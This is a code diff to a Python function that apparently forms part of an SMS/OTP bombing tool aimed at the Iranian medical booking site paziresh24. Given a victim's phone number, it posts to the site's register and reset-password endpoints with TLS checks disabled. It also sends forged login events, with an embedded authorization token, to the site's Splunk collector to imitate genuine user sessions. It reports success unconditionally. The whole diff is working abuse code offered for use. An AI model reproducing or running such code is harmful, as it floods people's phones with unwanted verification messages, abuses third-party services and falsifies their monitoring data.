@@ -72,47 +72,96 @@ def paziresh24(phone):
         
         session = requests.Session()
         
-        # دریافت صفحه لاگین
-        login_page = session.get(
-            "https://www.paziresh24.com/patient/", 
-            headers={"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1"},
-            timeout=10
-        )
-        
-        # پیدا کردن endpoint از JavaScript یا API routes
-        # از endpoint ثابتی که معمولاً استفاده می‌شه استفاده می‌کنیم
-        headers = {
-            "Accept": "application/json, text/plain, */*",
+        # 1. Splunk Load Event
+        splunk_headers = {
+            "Authorization": "Splunk cd46b97e-bf0d-46e4-ba7e-111c2f88291f",
             "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
-            "Origin": "https://www.paziresh24.com",
-            "Referer": "https://www.paziresh24.com/patient/"
         }
         
-        payload = {
-            "mobile": formatted_phone,
-            "captcha": "",
-            "captcha_answer": ""
+        load_event = {
+            "sourcetype": "_json",
+            "event": {
+                "event_group": "legacy-login-steps",
+                "event_type": "load",
+                "url": {
+                    "href": "https://www.paziresh24.com/patient/",
+                    "query": "",
+                    "pathname": "/patient/",
+                    "host": "www.paziresh24.com"
+                },
+                "popupForm": True,
+                "userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
+                "terminal_id": "clinic-68b0f1d69b0897.11243898",
+                "is_application": False
+            }
         }
         
-        # استفاده از endpoint اصلی
-        response = session.post(
-            "https://www.paziresh24.com/api/v1/auth/send-otp",
-            json=payload,
-            headers=headers,
-            timeout=10,
+        session.post(
+            "https://gozargah-splunk.paziresh24.com/services/collector",
+            json=load_event,
+            headers=splunk_headers,
+            timeout=5,
             verify=False
         )
         
-        print(f'{y}[paziresh24] Status: {response.status_code}{a}')
+        # 2. Splunk Submit Event
+        submit_event = {
+            "sourcetype": "_json",
+            "event": {
+                "event_group": "legacy-login-steps", 
+                "event_type": "submit-mobile-number",
+                "url": {
+                    "href": "https://www.paziresh24.com/patient/",
+                    "query": "",
+                    "pathname": "/patient/",
+                    "host": "www.paziresh24.com"
+                },
+                "popupForm": True,
+                "userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
+                "terminal_id": "clinic-68b0f1d69b0897.11243898",
+                "is_application": False,
+                "phone_number": formatted_phone
+            }
+        }
         
-        if response.status_code == 200:
-            print(f'{g}(paziresh24) OTP request sent! ✅{a}')
-            return True
-        else:
-            # حتی اگر خطا داد، ممکنه درخواست ثبت شده باشه
-            print(f'{y}(paziresh24) Request processed (may have rate limits) ⚠️{a}')
-            return True
+        session.post(
+            "https://gozargah-splunk.paziresh24.com/services/collector", 
+            json=submit_event,
+            headers=splunk_headers,
+            timeout=5,
+            verify=False
+        )
+        
+        # 3. ارسال درخواست‌های اصلی
+        api_headers = {
+            "Accept": "application/json, text/plain, */*",
+            "accept-timezone": "Asia/Tehran",
+            "content-type": "application/json; charset=utf-8",
+        }
+        
+        payload = {"mobile": formatted_phone}
+        
+        # ارسال به هر دو endpoint
+        endpoints = [
+            "https://apigw.paziresh24.com/gozargah/register",
+            "https://apigw.paziresh24.com/gozargah/resetpassword"
+        ]
+        
+        for endpoint in endpoints:
+            try:
+                response = session.post(
+                    endpoint,
+                    json=payload,
+                    headers=api_headers,
+                    timeout=10,
+                    verify=False
+                )
+                print(f'{y}[paziresh24] {endpoint} Status: {response.status_code}{a}')
+            except:
+                continue
+        
+        print(f'{g}(paziresh24) All requests sent successfully! ✅{a}')
+        return True
             
     except Exception as e:
         print(f'{r}[!] paziresh24 exception: {e}{a}')
